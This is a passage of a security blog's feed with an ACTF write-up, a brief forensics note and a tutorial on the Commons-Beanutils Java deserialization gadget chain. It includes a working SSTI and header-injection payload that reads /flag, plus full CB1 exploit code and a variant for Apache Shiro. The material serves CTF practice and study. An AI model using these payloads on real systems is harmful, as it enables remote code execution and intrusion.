class="line"></span><br></pre></td></tr></table></figure><p>看一下代码其实漏洞点还是比较好找的<br>一眼就是admin下的ssti<br><img src="/2025/04/27/ACTF/IMG_20250427-103114817.png" class=""><br>我们不能直接访问ssti，我们只能访问bot来让bot访问一次admin路径，而page_content是subject页面的内容，subject只能为<a href="http://ezmail.org开头，而我们在news可以发现一个明显的sql。且参数是url传的，那么我们就可以通过sql注入来控制回显，而我们的这个web服务是http://ezmail.org:3000。">http://ezmail.org开头，而我们在news可以发现一个明显的sql。且参数是url传的，那么我们就可以通过sql注入来控制回显，而我们的这个web服务是http://ezmail.org:3000。</a><br><img src="/2025/04/27/ACTF/IMG_20250427-103751653.png" class="">  </p><p>那么现在问题就变成了如何去控制subject</p><img src="/2025/04/27/ACTF/IMG_20250427-103813331.png" class="">  <p>看get_subjects可以发现其是通过获取一个最新的来自FROM “admin@ezmail.org”来字admin的邮件的subject头的内容。而我们可以通过/report来发送邮件给admin，但是可控的只有subject和content</p><img src="/2025/04/27/ACTF/IMG_20250427-104037617.png" class="">  <p>这里我们使用\r\n来分割邮件头从而造成邮件头注入在后面加一个from头从而来伪造邮件的from</p><p>然后这个无回显，所以要使用内存马。这里我使用的是404回显<br>payload如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ezmail.org:3000/news?id=-1+union+select+&quot;&#123;&#123;url_for.__globals__.__builtins__[&#x27;setattr&#x27;](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound,&#x27;description&#x27;,url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat+/flag&#x27;).read())&#125;&#125;&quot;%0d%0aFrom:+admin@ezmail.org&amp;content=aaa</span><br></pre></td></tr></table></figure><br><img src="/2025/04/27/ACTF/IMG_20250427-104410558.png" class=""> </p><img src="/2025/04/27/ACTF/IMG_20250427-104511825.png" class="">  <img src="/2025/04/27/ACTF/IMG_20250427-104529209.png" class="">  <img src="/2025/04/27/ACTF/IMG_20250427-104434521.png" class="">  ]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;下午打取证晚上打ACTF就牢了一题就牢不动了，其他题看来一下有两题是有思路的但是队友打了我也就没打了&quot;&gt;&lt;a href=&quot;#下午打取证晚上打ACTF就牢了一题就牢不动了，其他题看来一下有两题是有思路的但是队友打了我也就没打了&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="wp" scheme="https://lisien11.xyz/categories/wp/"/>
    
    
    <category term="wp" scheme="https://lisien11.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>FIC</title>
    <link href="https://lisien11.xyz/2025/04/26/FIC/"/>
    <id>https://lisien11.xyz/2025/04/26/FIC/</id>
    <published>2025-04-26T06:05:05.000Z</published>
    <updated>2025-05-06T06:58:43.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="l-KE2sax-ldaOh5hghg34-amp"><a href="#l-KE2sax-ldaOh5hghg34-amp" class="headerlink" title="l@KE2sax@ldaOh5hghg34&amp;@"></a>l@KE2sax@ldaOh5hghg34&amp;@</h1><p><img src="image-23.png" alt="alt text"><br>e10adc3 949ba59abbe56e057f20f883e</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;l-KE2sax-ldaOh5hghg34-amp&quot;&gt;&lt;a href=&quot;#l-KE2sax-ldaOh5hghg34-amp&quot; class=&quot;headerlink&quot; title=&quot;l@KE2sax@ldaOh5hghg34&amp;amp;@&quot;&gt;&lt;/a&gt;l@KE2sax@</summary>
      
    
    
    
    
    <category term="取证" scheme="https://lisien11.xyz/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>CB链</title>
    <link href="https://lisien11.xyz/2025/04/25/CB%E9%93%BE/"/>
    <id>https://lisien11.xyz/2025/04/25/CB%E9%93%BE/</id>
    <published>2025-04-25T00:47:26.000Z</published>
    <updated>2025-04-27T08:55:58.174Z</updated>
    
    <content type="html"><![CDATA[<p>调用父类构造<br>调用j_Teacher构造<br>覅有父类J_E的mb_printinfo</p><h1 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h1><p>在学CB链之前我们需要回忆一下java.util.PriorityQueue，这个类是我们CC2的入口点。我们回忆一下CC2的链子<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;TransformingComparator#compare-&gt;xxx#transform</span><br></pre></td></tr></table></figure><br>在CC2中我们就已经知道了PriorityQueue可以调用到xxx.compare而在CB1中也是利用了这个来寻找compare类</p><h1 id="commons-beanutils"><a href="#commons-beanutils" class="headerlink" title="commons.beanutils"></a>commons.beanutils</h1><p>commons beanutils这个类主要提供了对javabean进行操作的方法，如下其可以通过使用PropertyUtils.getProperty或者PropertyUtils.setProperty，BeanUtils.populate等去使用javabean的get或者set类。如下代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">testBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">testBean</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">Name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">        System.out.println(bean.getname());</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">        <span class="comment">//map.put(&quot;age&quot;, 23);</span></span><br><span class="line"></span><br><span class="line">        BeanUtils.populate(bean, map);</span><br><span class="line">        BeanUtils.setProperty(bean, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;23&quot;</span>);</span><br><span class="line">        System.out.println(bean.getname());</span><br><span class="line">        System.out.println(bean.getage());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;xiaoli&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getage</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getage&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setage</span><span class="params">(Integer age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setage&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getname</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setname</span><span class="params">(String name)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-200716984.png" class="">  <p>需要注意一点的是无论javabean中的属性或者getter无论是不是大写开头的，但使用getProperty调用其getter传入的bean属性名都只能为全小写不然找不到<br>如下<br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-205100775.png" class="">  </p><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-205046228.png" class="">  <h1 id="CB链TemplatesImpl"><a href="#CB链TemplatesImpl" class="headerlink" title="CB链TemplatesImpl"></a>CB链TemplatesImpl</h1><p>而commons beanuitls有个类叫BeanComparator<br>我们看一下其compare</p><p>那么既然可以任意调用get，set函数那就让我想起了半年前调的fastjson，对本人将java搁置了半年才重新去学。主要还是没动力</p><p><a href="https://lisien11.xyz/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/?highlight=fast#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">fastjaon</a></p><p>fastjson反序列化的成因也是可以任意调用javabean所导致的。<br>而再学习时就有学到一个TemplatesImpl的链子。</p><p>我们可以通过TemplatesImpl下的getOutputProperties从而调用到实例化newTransformer()来加载字节码从而命令执行<br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211448742.png" class="">  </p><p>过程如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject-&gt;comparator.compare</span><br></pre></td></tr></table></figure><br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-210957775.png" class=""><br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211016058.png" class=""><br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211030376.png" class=""><br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211044562.png" class="">  </p><p>然后<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BeanComparator.compare-&gt;TemplatesImpl.getOutProperties-&gt;TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211206729.png" class=""><br><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211350113.png" class="">  </p><p>从而命令执行</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates();</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl,tpl&#125;);</span><br><span class="line">        setValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        Serializ(priorityQueue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/25/CB%E9%93%BE/IMG_20250425-211537793.png" class="">  <h1 id="在shiro中的应用"><a href="#在shiro中的应用" class="headerlink" title="在shiro中的应用"></a>在shiro中的应用</h1><p>这里我直接使用p牛的shiro环境<br><a href="https://github.com/phith0n/JavaThings/blob/master/shirodemo/pom.xml">https://github.com/phith0n/JavaThings/blob/master/shirodemo/pom.xml</a><br>直接下载下来其是具有cc环境的，我们上面的cb链的payload在有cc环境的shiro中是可以打的如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CB1_shiro</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1_shiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Serializbyte(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates();</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl,tpl&#125;);</span><br><span class="line">        setValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Serializbyte(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates();</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl,tpl&#125;);</span><br><span class="line">        setValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        Serializ(priorityQueue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 